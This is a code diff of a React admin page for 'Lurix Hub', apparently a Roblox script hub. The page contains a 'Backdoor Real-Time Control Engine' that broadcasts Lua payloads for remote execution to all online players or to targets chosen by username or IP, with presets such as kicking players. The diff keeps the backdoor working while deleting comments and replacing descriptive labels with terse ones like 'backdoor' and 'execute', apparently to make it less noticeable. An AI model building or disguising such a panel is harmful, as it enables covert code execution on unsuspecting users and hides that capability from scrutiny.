@@ -16,7 +16,6 @@ export default function AdminPage() {
   const [isLoggingIn, setIsLoggingIn] = useState(false);
   const [activeTab, setActiveTab] = useState('custom_home'); // 'scripts' | 'backdoor' | 'custom_home' | 'user_logs' | 'settings'
   
-  // Scripts State
   const [scripts, setScripts] = useState([]);
   const [selectedScript, setSelectedScript] = useState(null);
   const [code, setCode] = useState('');
@@ -26,19 +25,16 @@ export default function AdminPage() {
   const [searchQuery, setSearchQuery] = useState('');
   const [statusFilter, setStatusFilter] = useState('all');
 
-  // Logs State
   const [logs, setLogs] = useState([]);
   const [logSearchQuery, setLogSearchQuery] = useState('');
   const [isLoadingLogs, setIsLoadingLogs] = useState(false);
 
-  // Backdoor Remote Control State
-  const [backdoorTargetType, setBackdoorTargetType] = useState('ALL'); // 'ALL' | 'USER' | 'IP'
+  const [backdoorTargetType, setBackdoorTargetType] = useState('ALL'); 
   const [backdoorTargetValue, setBackdoorTargetValue] = useState('ALL');
-  const [backdoorLuaPayload, setBackdoorLuaPayload] = useState('print("[Lurix Backdoor]: Executed remote payload!")');
+  const [backdoorLuaPayload, setBackdoorLuaPayload] = useState('print("[Lurix Backdoor]: Executed")');
   const [isSendingBackdoor, setIsSendingBackdoor] = useState(false);
   const [backdoorHistory, setBackdoorHistory] = useState([]);
 
-  // Main Page Settings State
   const [siteTitle, setSiteTitle] = useState('LURIX HUB');
   const [badgeText, setBadgeText] = useState('Online & Active');
   const [supportedGames, setSupportedGames] = useState([
@@ -69,7 +65,7 @@ export default function AdminPage() {
       });
 
       if (!res.ok) {
-        alert(`❌ Lỗi Server (${res.status}): Vui lòng kiểm tra đã tạo API verify chưa!`);
+        alert(`❌  (${res.status}):`);
         return;
       }
 
@@ -81,7 +77,7 @@ export default function AdminPage() {
         loadLogsData();
         loadBackdoorHistory();
       } else {
-        alert('❌ Mật khẩu Admin không chính xác!');
+        alert('error');
       }
     } catch (err) {
       alert('⚠️ Không thể kết nối API: ' + err.message);
@@ -784,25 +780,25 @@ sound:Play()`);
             <div className="flex items-center justify-between border-b border-gray-800 pb-3">
               <div className="flex items-center gap-2">
                 <Radio className="w-5 h-5 text-yellow-400 animate-pulse" />
-                <h2 className="text-sm font-black text-yellow-400 uppercase tracking-wider">⚡ Backdoor Real-Time Control Engine</h2>
+                <h2 className="text-sm font-black text-yellow-400 uppercase tracking-wider">backdoor</h2>
               </div>
               <span className="text-[10px] bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 px-2 py-0.5 rounded-full font-extrabold">
-                RCE LOADSTRING V3
+                LOADSTRING
               </span>
             </div>
 
             {/* Target Selector */}
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
               <div>
-                <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">ĐỐI TƯỢNG MỤC TIÊU (TARGET):</label>
+                <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">TARGET:</label>
                 <select
                   value={backdoorTargetType}
                   onChange={(e) => setBackdoorTargetType(e.target.value)}
                   className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white focus:border-yellow-500 outline-none cursor-pointer"
                 >
-                  <option value="ALL">🌐 Broadcast (TẤT CẢ NGƯỜI CHƠI ONLINE)</option>
-                  <option value="USER">👤 Theo Roblox Username</option>
-                  <option value="IP">🛡️ Theo Địa Chỉ IP</option>
+                  <option value="ALL">everyone</option>
+                  <option value="USER">username</option>
+                  <option value="IP">IP</option>
                 </select>
               </div>
 
@@ -822,7 +818,7 @@ sound:Play()`);
 
             {/* Quick Presets */}
             <div>
-              <label className="text-[10px] font-extrabold text-gray-400 mb-1.5 block">LỆNH MẪU NHANH (QUICK ACTIONS):</label>
+              <label className="text-[10px] font-extrabold text-gray-400 mb-1.5 block">command:</label>
               <div className="flex flex-wrap gap-2">
                 <button onClick={() => setPresetPayload('kick')} className="bg-red-500/15 border border-red-500/30 text-red-400 hover:bg-red-500/30 px-3 py-1.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                   <Skull className="w-3.5 h-3.5" /> Kick Player
@@ -841,7 +837,7 @@ sound:Play()`);
 
             {/* Lua Payload Editor */}
             <div>
-              <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">LUA CODE PAYLOAD SẼ THỰC THI TRÊN MÁY CON:</label>
+              <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">code:</label>
               <div className="h-[240px] border border-gray-800 rounded-2xl overflow-hidden shadow-inner bg-[#1e1e1e]">
                 <Editor
                   height="100%"
@@ -860,7 +856,7 @@ sound:Play()`);
               className="w-full bg-gradient-to-r from-yellow-500 to-amber-600 text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_25px_rgba(245,158,11,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 active:scale-95 disabled:opacity-50"
             >
               {isSendingBackdoor ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
-              {isSendingBackdoor ? 'ĐANG PHÁT LỆNH REMOTE...' : 'PHÁT LỆNH LUA BACKDOOR THỜI GIAN THỰC'}
+              {isSendingBackdoor ? 'done' : 'execute'}
             </button>
           </div>
 
